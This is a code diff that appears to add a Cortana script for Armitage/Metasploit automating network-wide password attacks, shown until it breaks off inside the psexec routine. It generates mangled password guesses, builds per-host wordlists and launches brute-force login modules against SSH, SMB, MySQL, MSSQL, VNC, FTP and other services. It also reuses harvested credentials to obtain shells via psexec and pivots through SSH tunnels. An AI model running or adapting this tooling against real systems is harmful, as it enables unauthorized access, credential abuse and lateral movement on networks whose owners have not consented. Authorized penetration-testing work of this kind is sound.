+	if( $pass ismatch '.*\d\d$' ) {
+		$newpass = left($pass, strlen($pass)-2 ) . (charAt($pass, strlen($pass)-2) + 1) . right($pass, 1);
+		if ($newpass !in @creds && $newpass !in @mangled) { add(@mangled, $newpass, size(@mangled)); }
+		$newpass = left($pass, strlen($pass)-2 ) . (charAt($pass, strlen($pass)-2) - 1) . right($pass, 1);
+		if ($newpass !in @creds && $newpass !in @mangled) { add(@mangled, $newpass, size(@mangled)); }
+	}
+
+	# Increment and decrement the third last digit
+	if( $pass ismatch '.*\d\d\d$' ) {
+		$newpass = left($pass, strlen($pass)-3 ) . (charAt($pass, strlen($pass)-3) + 1) . right($pass, 2);
+		if ($newpass !in @creds && $newpass !in @mangled) { add(@mangled, $newpass, size(@mangled)); }
+		$newpass = left($pass, strlen($pass)-3 ) . (charAt($pass, strlen($pass)-3) - 1) . right($pass, 2);
+		if ($newpass !in @creds && $newpass !in @mangled) { add(@mangled, $newpass, size(@mangled)); }
+	}
+
+	# Remove all trailing digits
+	if( $pass ismatch '.*\d+$' ) {
+		$newpass = replace($pass, '\d+$', "");
+		if ($newpass !in @creds && $newpass !in @mangled) { add(@mangled, $newpass, size(@mangled)); }
+	}
+
+	# These rules can be used multiple times
+	$size = size(@mangled);
+	for( $x = 0 ; $x <= size(@mangled) ; $x++ ){
+		$oldsize = size(@mangled);
+			
+		$pass = @mangled[$x];
+		
+		#println("\c4 pass: " . $pass );
+		
+		# need to find a better way to do this
+		
+		for( $rules = 1 ; $rules <= $rule_complexity ; $rules++ ){
+			$newpass = apply_rule($rules, $pass);
+			
+			if( $newpass !in @creds && $newpass !in @mangled && $newpass ne "" ) {
+				add(@mangled, $newpass, size(@mangled) );
+			}
+		}
+		if( $oldsize < size(@mangled) ){
+			#print("\c5.");
+		}
+		else {
+			#println("\c9 done");
+			break;
+		}
+		
+		
+		#println("Size of all the mangled passwords: " . size(@mangled) );
+		if( size(@mangled) > 200 ){
+			#println("\c2 emergency break");
+			break;
+		}
+	}
+	
+
+# take the username and add to front/back 123 456, and do some other mangling
+# although this password should only be tried on corresponding usernames
+# so maybe need to do this in update_creds or something
+
+# lookup word in dictionary and find those that are close or similar to the word, new -> newer, newest, etc
+# maybe use some portable dictionary library
+# take the password, remove leetspeak etc
+# remove trailing numbers
+# search for all words that are *password*
+# then add the trailing numbers back again
+#
+# create regex pattern from password
+# replace digits with ? or just remove
+# then search for the word in dictionary
+
+
+	if( $inputuser ne '' ){
+		# add the user to the password list so we try user:user
+		# make sure we dont add usernames with domains domain\user
+		# remove the domain from the username
+		if( "\\" isin $inputuser ){
+			$inputuser = substr($inputuser, indexOf($inputuser, "\\") + 1 );
+		}
+		add(@mangled, $inputuser);
+		
+		# add the username in reverse root:toor
+		add(@mangled, reverse_string($inputuser) );
+	}
+	
+	# now add a blank password
+	add(@mangled, "");
+	
+	clear(@creds);
+	return @mangled;
+}
+
+sub apply_rule {
+	local('$rulenum $pass $newpass');
+	$rulenum = $1;
+	$pass = $2;
+	$newpass = "";
+	
+	# by popularity as described at http://www.architectingsecurity.com/2010/09/11/password-patterns/
+	if( $rulenum eq "1" ){
+		# Replace all i with 1
+		if( $pass ismatch '.*i.*' ) {
+			$newpass = replace($pass, 'i', "1");
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "2" ){
+		# Replace all l with 1
+		if( $pass ismatch '.*l.*' ) {
+			$newpass = replace($pass, 'l', "1");
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "3" ){
+		# Replace all o with 0
+		if( $pass ismatch '.*o.*' ) {
+			$newpass = replace($pass, 'o', "0");
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "4" ){
+		# Replace all s with 5
+		if( $pass ismatch '.*s.*' ) {
+			$newpass = replace($pass, 's', "5");
+			#println("rule: " . $rulenum);
+		}
+	}
+	
+	if( $rulenum eq "5" ){
+		# Replace all b with 6
+		if( $pass ismatch '.*b.*' ) {
+			$newpass = replace($pass, 'b', "6");
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "6" ){
+		# Replace all g with 9
+		if( $pass ismatch '.*g.*' ) {
+			$newpass = replace($pass, 'g', "9");
+			#println("rule: " . $rulenum);
+		}
+	}
+	
+	
+	
+	if( $rulenum eq "7" ){
+		# Append a 1 if the last char AND last char is not a digit
+		if( $pass ismatch '.*\D$' && $pass ismatch '^\D.*' ) {
+			$newpass = $pass . "1";
+			#println("rule: " . $rulenum);
+		}
+	}
+
+	if( $rulenum eq "8" ){
+		# Prefix with 1 if the first char AND last char is not a digit
+		if( $pass ismatch '.*\D$' && $pass ismatch '^\D.*' ) {
+			$newpass = "1" . $pass;
+			#println("rule: " . $rulenum);
+		}
+	}
+
+	if( $rulenum eq "9" ){
+		# Append a 123 if the last char AND first char is not a digit
+		if( $pass ismatch '.*\D$' && $pass ismatch '^\D.*' ) {
+			$newpass = $pass . "123";
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "10" ){
+		# Append a 456 if the last char AND first char is not a digit
+		if( $pass ismatch '.*\D$' && $pass ismatch '^\D.*' ) {
+#			$newpass = $pass . "456";
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "11" ){
+		# Append a 789 if the last char AND first char is not a digit
+		if( $pass ismatch '.*\D$' && $pass ismatch '^\D.*' ) {
+#			$newpass = $pass . "789";
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "12" ){
+		# Prefix with 123 if the first char AND last char is not a digit
+		if( $pass ismatch '.*\D$' && $pass ismatch '^\D.*' ) {
+			$newpass = "123" . $pass;
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "13" ){
+		# Prefix with 456 if the first char AND last char is not a digit
+		if( $pass ismatch '.*\D$' && $pass ismatch '^\D.*' ) {
+#			$newpass = "456" . $pass;
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "14" ){
+		# Prefix with 789 if the first char AND last char is not a digit
+		if( $pass ismatch '.*\D$' && $pass ismatch '^\D.*' ) {
+#			$newpass = "789" . $pass;
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "15" ){
+		# Append a ! if the last char is not a digit, doesnt already end with !@#
+		if( $pass ismatch '.*\D$' && right($pass, 1) ne "!" && right($pass, 3) ne "!@#" ) {
+			$newpass = $pass . "!";
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "16" ){
+		# Append a !@# if the last char is not a digit, doesnt already end with !@# or !
+		if( $pass ismatch '.*\D$' && right($pass, 3) ne "!@#" && $pass !ismatch '.*\!$') {
+			$newpass = $pass . "!@#";
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "17" ){
+		# Make the first char upper case if its lower case
+		if( $pass ismatch '^\p{Lower}.*' ) {
+			$newpass = uc(charAt($pass, 0)) . substr($pass, 1, strlen($pass) );
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "18" ){
+		# Make the first char lower case if its upper case
+		if( $pass ismatch '^\p{Upper}.*' ) {
+			$newpass = lc(charAt($pass, 0)) . substr($pass, 1, strlen($pass) );
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "19" ){
+		# Replace all a with @
+		if( $pass ismatch '.*a.*' ) {
+			$newpass = replace($pass, 'a', "@");
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "20" ){
+		# Replace all s with $
+		if( $pass ismatch '.*s.*' ) {
+			$newpass = replace($pass, 's', "\\$");
+			# "
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "21" ){
+		# Lowercase the whole password
+		if( $pass ismatch '.*\p{Upper}.*' ) {
+			$newpass = lc($pass);
+			#println("rule: " . $rulenum);
+		}
+	}
+	if( $rulenum eq "22" ){
+		# Replace all 1 with !
+		if( $pass ismatch '.*1.*' ) {
+			$newpass = replace($pass, '1', "\\!");
+			#println("rule: " . $rulenum);
+		}
+	}
+	
+	return $newpass;
+}
+
+sub reverse_string {
+	local('$input $output $x');
+	$input = $1;
+	for ($x = strlen($input) - 1; $x >= 0 ; $x = $x - 1) {
+		$output = $output . charAt($input, $x);
+	}
+	return $output;
+}
+
+###############################################################################
+# Gets the unique credentials for a specific services
+# returns the targets and unique creds
+#
+# the @uniqcreds can be used as follows:
+# @uniqcreds[$x]['user'] is the username
+# @uniqcreds[$x]['pass'] is the password
+# @uniqcreds[$x]['hosts'] is all the hosts where the username and password work
+###############################################################################
+command get_uniq_creds_for_service {
+	println(get_uniq_creds_for_service($1) );
+}
+
+sub get_uniq_creds_for_service {
+# $1 is the port number to lookup in creds
+	local('$searchterm @searchports $searchport %targethash $targetnum $temptarget @targets $services $creds $row $host $port $name $user $pass $info @userpass %temp $x $y $instances @hosts $strhosts @uniqcreds');
+	$searchterm = $1;
+	
+	# get all the ip addresses that have the port number or service named $searchterm
+	# the second argument means that all hosts are returned
+	# and to NOT ignore the hosts that are already being attacked
+	%targethash = get_targets($searchterm, 1);
+	
+	# parse the output of get_targets
+	for( $targetnum = 0 ; $targetnum < size(%targethash) ; $targetnum++ ){
+		# now take every host returned from get_targets and create a unique array @targets		
+		foreach $temptarget ( split(", ", %targethash[$targetnum]['rhosts']) ){
+			if( $temptarget !in @targets ){
+				add(@targets, $temptarget);
+			}
+		}
+	}
+	
+	# put all the ports matching the searchterm into @searchports
+	$services = call("db.services")['services'];
+	foreach $row ($services) {
+		($host, $port, $name, $info) = values($row, @("host", "port", "name", "info"));
+		# if the searchterm matchs the name, port, or isin the info then its a target
+		if( ($searchterm eq $name || $searchterm isin $info) || $searchterm eq $port ){
+			if( $port !in @searchports ){
+				add(@searchports, $port);
+			}
+		}
+	}
+	
+	if ( size(@targets) > 0 ) {
+		$creds = call("db.creds")['creds'];
+		foreach $row ($creds) {
+			($host, $port, $user, $pass) = values($row, @("host", "port", "user", "pass"));
+			if ( $port in @searchports ) {
+				%temp['user'] = $user;
+				%temp['pass'] = $pass;
+				add(@userpass, %temp);
+				clear(%temp);
+			}
+		}
+		sorta(@userpass);
+		
+		# this will remove duplicates in the @userpass array
+		for ($x = 0; $x < size(@userpass) ; $x++) {
+			$instances = 0;
+			for ($y = 0; $y < size(@userpass) ; $y++) {
+				if ( @userpass[$y] eq @userpass[$x] ) {
+					$instances++;
+				}
+			}
+			if ( $instances > 1 ) {
+				$y = 0;
+				while ( $instances > 1 ) {
+					if ($y < size(@userpass) ) {
+						if ( $instances ne 1 && @userpass[$x] eq @userpass[$y] ) {
+							@userpass[$y] = "crap";
+							$instances--;
+						}
+					}
+					else {
+						break;
+					}
+					$y++;
+				}
+			}
+		}
+		remove(@userpass, "crap");
+		sorta(@userpass);
+
+		#println("\c3DEBUG userpass after= " . @userpass );
+		
+		
+				
+		# take the user and pass
+		for ($x = 0; $x < size(@userpass) ; $x++) {
+			
+			#println("user\[" . @userpass[$x]['user'] . "\] pass\[" . @userpass[$x]['pass'] . "\]");
+			
+			foreach $searchport (@searchports){
+				
+				#println("\c9searchport= " . $searchport);
+			
+				# get all the hosts that have user @userpass[$x]['user'] and pass @userpass[$x]['pass']
+				foreach $row ($creds) {
+					($host, $port, $user, $pass) = values($row, @("host", "port", "user", "pass"));
+					if( @userpass[$x]['user'] eq $user && @userpass[$x]['pass'] eq $pass ){
+						if( $host !in @hosts && $port eq $searchport){
+							# add the host the list
+							add(@hosts, $host);
+							#println("\cB credsport is= " . $port );
+							#println("\cB host is= " . $host );
+							#println("\cB user\[" . $user . "\] pass\[" . $pass . "\]");
+						}
+					}
+				}
+				
+				# if we found some hosts that have the creds we're looking for on the port we're looking for then we should add that rport, hosts, user, pass data to the uniqcreds array
+				if( size(@hosts) > 0 ){
+					
+					#println("hosts= " . @hosts);
+					
+					$strhosts = @hosts[0];
+					if( size(@hosts) > 1 ){
+						for ($y = 1; $y < size(@hosts) ; $y++) {
+							$strhosts = $strhosts . ", " . @hosts[$y];
+						}
+					}
+					%temp['hosts'] = $strhosts;
+					%temp['port'] = $searchport;
+					%temp['user'] = @userpass[$x]['user'];
+					%temp['pass'] = @userpass[$x]['pass'];
+					add(@uniqcreds, %temp);
+					
+					#println("\c3 temp(port)= "  . %temp['port'] );
+					#println("\c3 temp(user)= "  . %temp['user'] );
+					#println("\c3 temp(pass)= "  . %temp['pass'] );
+					#println("\c3 temp(hosts)= " . %temp['hosts'] );
+					#println("\c0--------------------------------------------");
+				}
+				clear(@hosts);
+				clear(%temp);
+			}
+		}
+	}
+	
+	# this is debugging, please delete after the above works
+	#for( $x = 0 ; $x < size(@uniqcreds) ; $x++ ){
+	#	println("\c5DEBUG uniqcred= " . @uniqcreds[$x] );
+	#}
+	
+	clear(@searchports);
+	clear(@targets);
+	clear(@userpass);
+	clear(@hosts);
+	clear(%targethash);
+	clear(%temp);
+	
+	return @uniqcreds;
+}
+
+###############################################################################
+# Get targets
+###############################################################################
+command get_targets {
+	local('$1 $2 %targets $targetnum');
+	if( $2 !is $null ){
+		%targets = get_targets($1, $2);
+	}
+	else {
+		%targets = get_targets($1);
+	}
+	
+	#println("get_targets: " . %targets );
+	#println("size: " . size(%targets) );
+	for( $targetnum = 0 ; $targetnum < size(%targets) ; $targetnum++ ){
+		println("targets\[$targetnum\]\[rhosts\]: " . %targets[$targetnum]['rhosts'] );
+		println("targets\[$targetnum\]\[rport\]: " . %targets[$targetnum]['rport'] );
+	}
+	
+	
+	#println("\c9size: " . size(%targets[]['rhosts']) );
+	
+	#
+	# either fix get_targets to reply with nothing if RHOSTS is zero
+	# or
+	# add if( %targets[$targetnum]['rhosts'] ){ } to each brute module
+	#
+	#
+	
+}
+
+sub get_targets {
+# $1 will be the name of the service or port number
+	local('$1 $2 $searchterm $include_hosts_being_attacked $targetnum $joblist @searchport $services $row $host $port $name $info @targetports @hosts_being_attacked $targetport @targethosts %targets $index $temp $jobid $jobname $jobrport $jobrhosts %jobinfo $sessionid ');
+	$searchterm = $1;
+	$include_hosts_being_attacked = 0;
+	if( $2 !is $null ){
+		$include_hosts_being_attacked = $2;
+	}
+	
+	$targetnum = 0;
+	
+	# map the searchterm to a default port for that service and add it to @searchport
+	addAll(@searchport, %default_ports[$searchterm] );
+	
+	# translate the $searchterm into a port number and store them all in @targetports
+	$services = call("db.services")['services'];
+	foreach $row ($services) {
+		($host, $port, $name, $info) = values($row, @("host", "port", "name", "info"));
+		# if the searchterm matchs the name, port, or isin the info then its a target
+		
+		#println("\cBDEBUG host[" . $host . "] port[" . $port . "] name[" . $name . "] info[" . $info . "]");
+		
+		if( ($searchterm eq $name || $searchterm isin $info) || ($searchterm eq $port || $port in @searchport) ){
+			if( $port !in @targetports ){
+				add(@targetports, $port);
+			}
+		}
+	}
+	# clean/remove blanks
+	removeAll(@targetports, '')
+	
+	#println("\cBDEBUG Found the following ports= " . @targetports );
+	
+#
+# DO I NEED TO CALL SYNC HERE OR SOMETHING TO MAKE SURE THAT THE JOBS ARE IN SYNC?
+# GET LOTS OF ERRORS ABOUT JOBS NOT EXISTING OR NOT HAVING 'name'
+#
+
+	# if we are currently running a brute force on this port/service, then dont run another
+	$joblist = call('job.list');
+	if( size($joblist) > 0 ){
+		# make sure the brute force job is not already running
+		foreach $jobid (keys($joblist)) {
+			if ( job_info($jobid) !is $null ) {
+				$jobname = job_info($jobid)['name'];
+				$jobrport = job_info($jobid)['datastore']['RPORT'];
+				$jobrhosts = job_info($jobid)['datastore']['RHOSTS'];
+				
+				# if the job has "_login" in its name, add its name value to the jobrportarray
+				if ("_login" isin $jobname) {
+					$jobname = substr($jobname, lindexOf($jobname, "/") + 1, lindexOf($jobname, "_") );
+					
+					# if the RPORT is in the search term or what we are targetting then add the RHOST to @hosts_being_attacked
+					if( $jobrport in @targetports ){
+						
+						#println("\c8 adding " . job_info($jobid)['datastore']['RHOSTS'] );
+						
+						add(@hosts_being_attacked, $jobrhosts );
+					}
+				}
+			}
+		}
+	}
+	
+	#println("\c7DEBUG hosts being attacked \t\t" . @hosts_being_attacked );
+	
+	
+	# now search through all @targetports and find each one in the services db
+	# then add them all to the %targets hash array
+	foreach $targetport (@targetports) {
+		#println("\cBDEBUG looking in services for port " . $targetport);
+	
+		$services = call("db.services")['services'];
+		foreach $row ($services) {
+			($host, $port, $name, $info) = values($row, @("host", "port", "name", "info"));
+			# find the $targetport in the services database
+			if( $targetport eq $port && $host !in @targethosts ){
+			
+				# if we dont have a session on the host then lets attack it
+				if ( host_session($host) eq "" ) {
+			
+					add(@targethosts, $host);
+				}
+			}
+		}
+		
+		#println("\c3DEBUG The following have port " . $targetport . " open\t" . @targethosts );
+		
+		if( $include_hosts_being_attacked ne "1" ){
+			removeAll(@targethosts, @hosts_being_attacked);
+		}
+		
+		#println("\c5DEBUG we should only attack these\t\t" . @targethosts );
+		
+		# put everything from @targethosts into the string $temp
+		if( size(@targethosts) > 0 ){
+			$temp = @targethosts[0];
+			for( $index = 1 ; $index < size(@targethosts) ; $index++ ){
+				$temp = $temp . ", " . @targethosts[$index];
+			}
+		}
+		
+		# Only add the data if there are targets/RHOSTS values
+		if( strlen($temp) > 0 ){
+			%targets[$targetnum]['rhosts'] = $temp;
+			%targets[$targetnum]['rport'] = $targetport;
+			# increment to the next item in the @targets array
+			$targetnum++;
+		}
+		# clear/empty out the array that will hold the hosts with $targetport open
+		clear(@targethosts);
+	}
+
+#====================================================================
+# experimental stuff
+#					
+#println("complete session: " . sessions() );
+#foreach $sessionid ( session_ids() ){
+#	println("session $sessionid info: " . sessions()[$sessionid]['info'] );
+#}		
+#
+# Look at all the sessions info, pull out the creds the same way as its done for sudo etc
+# then remove the __user__ from the creds
+#====================================================================
+	
+	clear(@targetports);
+	clear(@targethosts);
+	clear(%jobinfo);
+	
+	if($debug != 0){
+		println("\cADEBUG targets = " . %targets );
+	}
+	
+	return %targets;
+}
+###############################################################################
+# this gets all the shells using all the services and creds that are known
+
+command get_all_shells {
+	get_all_shells();
+}
+
+sub get_all_shells {
+	attack_smb_psexec();
+	get_shells_for_service("ssh", "scanner/ssh/ssh_login");
+	get_shells_for_service("mysql", "scanner/mysql/mysql_login");
+	get_shells_for_service("1433", "scanner/mssql/mssql_login");
+	get_shells_for_service("oracle", "scanner/oracle/oracle_login");
+	get_shells_for_service("postgres", "scanner/postgres/postgres_login");
+	get_shells_for_service("telnet", "scanner/telnet/telnet_login");
+	get_shells_for_service("vnc", "scanner/vnc/vnc_login");
+	get_shells_for_service("vmware-auth", "scanner/vmware/vmauthd_login");
+	get_shells_for_service("ftp", "scanner/ftp/ftp_login");
+	get_shells_for_service("exec", "scanner/rservices/rexec_login");
+	get_shells_for_service("login", "scanner/rservices/rlogin_login");
+	get_shells_for_service("shell", "scanner/rservices/rsh_login");
+	get_shells_for_service("snmp", "scanner/snmp/snmp_login");
+	get_shells_for_service("afp", "scanner/afp/afp_login");
+	get_shells_for_service("mongodb", "scanner/mongodb/mongodb_login");
+	get_shells_for_service("pcanywhere", "scanner/pcanywhere/pcanywhere_login");
+}
+
+command get_shells_for_service {
+	get_shells_for_service($1, $2);
+}
+
+sub get_shells_for_service {
+	local('$search_service $module_name @uniqcreds $x $host @rhosts @ignore $y %options @targethost $ssh_tunnel_port');
+	$search_service = $1;
+	$module_name = $2;
+	
+	%options = copy(%module_options);
+	
+	@uniqcreds = get_uniq_creds_for_service($search_service);
+	if ( size(@uniqcreds) > 0 ) {
+	
+		if($debug != 0){
+			println("\c3DEBUG get_shells_for_service uniqcreds = " . @uniqcreds );
+		}
+		
+		for ($x = 0; $x < size(@uniqcreds) ; $x++) {
+			@rhosts = split(", ", @uniqcreds[$x]['hosts']);
+			foreach $host (@rhosts) {
+				# if we have a session for the host then ignore it
+				if( size(host_sessions( $host )) > 0 ){
+					add( @ignore, $host);
+				}
+			}
+			removeAll(@rhosts, @ignore);
+			# if we are missing loot for hosts, then get it now
+			if( size(@rhosts) > 0 ){
+				# loop through each host
+				for($y = 0; $y < size(@rhosts) ; $y++) {
+					# only continue if the target is in our network or we have a route/pivot to it
+					if( is_in_my_network(@rhosts[$y]) || have_route(@rhosts[$y], "255.255.255.255") ){
+						if( is_over_ssh_tunnel(@rhosts[$y]) ) {
+							$ssh_tunnel_port = get_ssh_tunnel_for_ip(@rhosts[$y]);
+							wait_for_tunnel($ssh_tunnel_port);
+							%options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+						}
+						%options['RPORT'] = @uniqcreds[$x]['port'];
+						%options['USERNAME'] = @uniqcreds[$x]['user'];
+						%options['PASSWORD'] = @uniqcreds[$x]['pass'];
+						
+						# we have to pass the RHOST value as an array
+						add(@targethost, @rhosts[$y]);						
+						auxiliary($module_name, @targethost, %options);
+						clear(@targethost);
+					}
+				}
+			}
+		}
+	}
+}
+
+###############################################################################
+# Attack starter
+# Searches for services named with the first argument ex. ssh
+# Then attacks those services with the module name of the
+#   second argument ex. scanner/ssh/ssh_login
+###############################################################################
+command attack_service {
+	println("Attacking \[" . $1 . "\] with module \[" . $2 . "\]");
+	attack_service($1, $2);
+}
+sub attack_service {
+	local('$1 $2 $3 $searchfor $attackmodule $SMBDomain %targets $targetnum @targets @targethost $targetport $x $wordlist_host_service_file %options $ssh_tunnel_port');
+	$searchfor = $1;
+	$attackmodule = $2;
+	if( $3 !is $null ){
+		$SMBDomain = $3;
+	}
+	
+	%targets = get_targets($searchfor);
+	if ( size(%targets) > 0 ) {
+		for( $targetnum = 0 ; $targetnum < size(%targets) ; $targetnum++ ){
+			$targetport = %targets[$targetnum]['rport'];
+			@targets = split(", ", %targets[$targetnum]['rhosts']);
+			for ($x = 0; $x < size(@targets); $x++) {
+				$wordlist_host_service_file = "wordlists/wordlist" . "_" . @targets[$x] . "_" . $targetport;
+				
+				# only continue if the target is in our network or we have a route/pivot to it
+				if( is_in_my_network(@targets[$x]) || have_route(@targets[$x], "255.255.255.255") ){
+					
+					# update the wordlist
+					update_wordlist(@targets[$x], $targetport);
+					
+					# only continue if the size of the wordlist is greater than zero
+					if( lof(script_resource($wordlist_host_service_file)) gt 0 ){
+					
+						if($debug != 0){
+							println("\c5DEBUG attacking target " . @targets[$x] . " port $targetport with $wordlist_host_service_file");
+						}
+						
+						%options = copy(%module_options);
+						%options['RPORT'] = %targets[$targetnum]['rport'];
+						%options['USERPASS_FILE'] = script_resource($wordlist_host_service_file);
+						
+					
+						if( is_over_ssh_tunnel(@targets[$x]) ){
+						
+							if($debug != 0){
+								println("\c2DEBUG is over ssh tunnel for ip " . @targets[$x] );
+							}
+							
+							$ssh_tunnel_port = get_ssh_tunnel_for_ip(@targets[$x]);
+							wait_for_tunnel($ssh_tunnel_port);
+							%options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+							
+							if($debug != 0){
+								println("\c2DEBUG we need to use a ssh tunnel " . %options['Proxies']);
+							}
+						}
+						
+						
+						if( $3 !is $null ){
+							%options['SMBDomain'] = $SMBDomain;
+						}
+						
+						# we have to pass RHOSTS as an array
+						add(@targethost, @targets[$x]);
+						auxiliary($attackmodule, @targethost, %options);
+						
+						clear(%options);
+						clear(@targethost);
+					}
+				}
+			}
+		}
+	}
+	clear(%targets);
+	clear(@targets);
+	clear(@targethost);
+}
+###############################################################################
+# SMB / PSEXEC
+###############################################################################
+command attack_smb {
+	println("Attacking smb");
+	attack_smb();
+	
+	# now get shells
+	#attack_smb_psexec();
+}
+
+sub attack_smb {
+	local('%targets $targetnum @domains $SMBDomain $host $info $port $state $starti $endi $domain $x $row $console $output');
+	# here we use "445" instead of smb, this targets everything on port 445
+	%targets = get_targets("445");
+	# netbios-ssn
+	if ( size(%targets) > 0 ) {
+
+		# this will populate the database services table with the domain in 'info' 
+		# THIS NEEDS TO RUN AND WAIT FOR IT TO FINISH THEN CONTINUE, use &inline ???
+		get_smb_domain();
+#
+#
+# only target hosts that have domain in info, dont target everything with all domains
+# hosts that have $info (with domain) means they have been scanned with smb_version
+#
+#
+		# maybe wait for smb_version to finish... or remove targets without 'domain' in info, under services db table with port 445?
+		
+		
+		# add all the discovered domains in the services db into the @domains array
+		foreach $row ( call("db.services")['services'] ) {
+			($host, $info, $port, $state) = values($row, @("host", "info", "port", "state"));
+			if ( "(domain:" isin $info ) {
+				$starti = indexOf($info, "(domain:");
+				$endi = indexOf($info, ")", $starti);
+				$domain = substr($info, $starti + 8, $endi);
+				if ( $domain ne "" && $domain !in @domains) {
+					add(@domains, $domain);
+				}
+			}
+		}
+		# we have to try a blank domain for hosts configured with "Classic - Users login as themselves"
+		add(@domains, '');
+
+		# make sure we have targets
+		if ( size(%targets) > 0 ) {
+			# loop over the domains array to run smb_login with all the possible domains
+			for ($x = 0; $x < size(@domains); $x++) {
+				$SMBDomain = @domains[$x];
+				for( $targetnum = 0 ; $targetnum < size(%targets) ; $targetnum++ ){
+					#println("\c5Launching smb_login against [" . split(", ", %targets[$targetnum]['rhosts']) . "][" . $SMBDomain . "]");
+					attack_service("445", "scanner/smb/smb_login", $SMBDomain);
+				}
+			}
+		}
+	}
+	clear(%targets);
+	clear($targetnum);
+	clear(@domains);
+}
+
+command get_smb_domain {
+	println("Getting all smb domains");
+	get_smb_domain();
+}
+
+sub get_smb_domain {
+	local('$row $host $info $name @hosts_with_domain %targets $targetnum @targets $x %scan_options @targethost $ssh_tunnel_port');
+	
+	
+	# get a list of hosts that we already know their domain info
+	foreach $row ( call("db.services")['services'] ) {
+		($host, $info, $name) = values($row, @("host", "info", "name"));
+		if( $name eq "smb" && "(domain:" isin $info ) {
+			if( $host !in @hosts_with_domain ){
+				add(@hosts_with_domain, $host);
+			}
+		}
+	}
+	
+	# here we use "445" instead of smb, this targets everything on port 445
+	%targets = get_targets("445", 1);
+	if ( size(%targets) > 0 ) {
+		for( $targetnum = 0 ; $targetnum < size(%targets) ; $targetnum++ ){
+			@targets = split(", ", %targets[$targetnum]['rhosts']);
+			
+			# remove all the hosts that already have domain info
+			removeAll(@targets, @hosts_with_domain);
+					
+			for ($x = 0; $x < size(@targets); $x++) {
+				# only continue if the target is in our network or we have a route/pivot to it
+				if( is_in_my_network(@targets[$x]) || have_route(@targets[$x], "255.255.255.255") ){
+			
+					if( is_over_ssh_tunnel(@targets[$x]) ){
+						$ssh_tunnel_port = get_ssh_tunnel_for_ip(@targets[$x]);
+						wait_for_tunnel($ssh_tunnel_port);
+						%scan_options['Proxies'] = "socks4:127.0.0.1:" . $ssh_tunnel_port;
+					}
+					%scan_options['THREADS'] = $threads;
+					
+					# we have to pass RHOSTS as an array
+					add(@targethost, @targets[$x]);
+					
+					auxiliary("scanner/smb/smb_version", @targethost, %scan_options);
+					clear(@targethost);
+					clear(%scan_options);
+				}
+			}
+		}
+	}
+}
+# MAYBE NEED TO DO A call TO METASPLOIT RPC SINCE IT WILL WAIT FOR THE RESPONSE?
+#
+# msfapi will contain the jobid
+# get the list of jobs, if $msfapi is in the list of jobs then sleep for 1s and continue loop
+#
+#		$targetsstring = join(', ', @targets);
+#		$msfapi = call("module.execute", "auxiliary", "scanner/smb/smb_version", %(
+#			RHOSTS => $targetsstring,
+#			THREADS => $threads));
+
+# maybe create global array of modules that are running
+# add modules with filter module.execute
+# heartbeat 10s to look at current jobs and update global array
+
+#		for( $targetnum = 0 ; $targetnum < size(%targets) ; $targetnum++ ){
+#			auxiliary("scanner/smb/smb_version", split(", ", %targets[$targetnum]['rhosts']), %(
+#				THREADS => $threads));
+#		}
+#	}
+
+
+command attack_smb_psexec {
+	println("Attacking smb with psexec");
+	attack_smb_psexec();
+}
+
+# smb_login will find creds and put into creds db, but psexec will get shells with those creds
+sub attack_smb_psexec {
+	local('%targets @pstargets $SMBUser $user $pass $host $port $psexectarget $creds $starti $row $x $SMBDomain $info $endi $name $payload $port $port_1 $port_2 %scan_options %handler_options $ssh_tunnel_port');
+	%targets = get_targets("445", 1);
+	@pstargets = split(", ", %targets[0]['rhosts']);
+	if ( size(@pstargets) > 0 ) {
+		#loop over targets and set to psexectarget
+		for ($x = 0; $x < size(@pstargets); $x++) {
+			$psexectarget = @pstargets[$x];
+			# get the relevant creds for the psexectarget
+			$creds = call("db.creds")['creds'];
+			foreach $row ($creds) {
+				($host, $user, $pass, $port) = values($row, @("host", "user", "pass", "port"));
+				if( ($host eq $psexectarget && $port eq 445) && ( is_in_my_network($psexectarget) || have_route($psexectarget, "255.255.255.255") ) ){
+					
+					# if there is no domain in the creds db, then just use the default set in SMBDomain at the top
+					$SMBUser = $user;
+					# if the username contains a domain, then extract the domain for psexec to work
+					if ( "\\" isin $user ) {
+						$starti = indexOf($user, "\\");
+						$SMBUser = substr($user, $starti + 1);
+						$SMBDomain = substr($user, 0, $starti);
+					}
+					else {
+					# get the domain from the services table instead
+						foreach $row ( call("db.services")['services'] ) {
+							($host, $info, $name) = values($row, @("host", "info", "name"));
+							if ($host eq $psexectarget && $name eq "smb" && "(domain:" isin $info) {
+								$starti = indexOf($info, "(domain:");
+								$endi = indexOf($info, ")", $starti);
+								$SMBDomain = substr($info, $starti + 8, $endi);
+							}
+						}
+					}
+
+					#println("\c5Launching psexec against [" . $psexectarget . "][" . $SMBDomain . "][" . $SMBUser . "][" . $pass . "]");
+					
+					%scan_options['RHOST'] = $psexectarget;
+					%scan_options['SMBUser'] = $SMBUser;
+					%scan_options['SMBPass'] = $pass;
+					%scan_options['SMBDomain'] = $SMBDomain;
+					%scan_options['DisablePayloadHandler'] = 'true';
+					%scan_options['WfsDelay'] = $WfsDelay;
+					
+					# If the target is found through a pivot then use the bind payload
+					if( !is_in_my_network($psexectarget) && have_route($psexectarget, "255.255.255.255") ){						
+						if( is_over_ssh_tunnel($psexectarget) ){
+							$ssh_tunnel_port = get_ssh_tunnel_for_ip($psexectarget);
